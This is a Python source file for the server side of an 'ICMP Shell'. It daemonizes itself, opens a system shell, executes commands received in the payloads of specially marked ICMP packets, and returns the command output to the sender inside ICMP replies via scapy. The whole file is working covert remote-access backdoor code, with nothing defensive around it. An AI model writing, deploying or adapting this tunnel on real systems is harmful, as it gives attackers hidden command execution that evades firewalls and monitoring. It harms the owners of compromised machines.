import argparse
import subprocess
import sys
import threading

from daemoniker import Daemonizer
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, send, sendp

import config
import opening_terminal
from opening_terminal import p

destination_mac = "ff:ff:ff:ff:ff:ff"
destination_ip = ""
is_debug = 1


def readstdout():
    global destination_ip, destination_mac
    for l in iter(p.stdout.readline, b""):
        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
        if string == '':
            continue
        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip, ttl=config.TTL) / ICMP(type=config.TYPE,
                                                                                                  id=config.ID) / string
        sendp(reply_packet, verbose=False)
        sys.stdout.write(string + "\n")


def readstderr():
    for l in iter(p.stderr.readline, b""):
        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
        if string == '':
            continue
        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip, ttl=config.TTL) / ICMP(type=config.TYPE,
                                                                                                  id=config.ID) / string
        sendp(reply_packet, verbose=False)
        sys.stderr.write(string + "\n")


def sendcommand(cmd):
    p.stdin.write(cmd.encode() + b"\n")
    p.stdin.flush()


def packet_callback(packet):
    global destination_ip, destination_mac
    if packet[ICMP].ttl == config.TTL and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
        destination_ip = packet[IP].src
        destination_mac = packet[Ether].src
        received_data = packet[ICMP].payload.load.decode('utf-8')
        print("-----+ OUT DATA +-----")
        sendcommand(received_data)


def sniff_in_debug():
    t1 = threading.Thread(target=readstdout)
    t2 = threading.Thread(target=readstderr)

    t1.start()
    t2.start()

    sniff(filter="icmp", prn=packet_callback)


with Daemonizer() as (is_setup, daemonizer):
    if is_setup:
        parser = argparse.ArgumentParser(description='ICMP Shell')

        parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
        parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')

        args = parser.parse_args()

        if args.i:
            config.ID = args.i
        if args.d:
            is_debug = 0

        if is_debug:
            sniff_in_debug()

    is_parent, is_debug, destination_mac, destination_ip = daemonizer(
        'icmp-shell.pid',
        is_debug,
        "ff:ff:ff:ff:ff:ff",
        ""
    )

p = subprocess.Popen(
    opening_terminal.terminal_name,
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE,
    stderr=subprocess.PIPE,
    shell=True
)

t1 = threading.Thread(target=readstdout)
t2 = threading.Thread(target=readstderr)

if is_debug == 0:
    t1.start()
    t2.start()

    sniff(filter="icmp", prn=packet_callback)
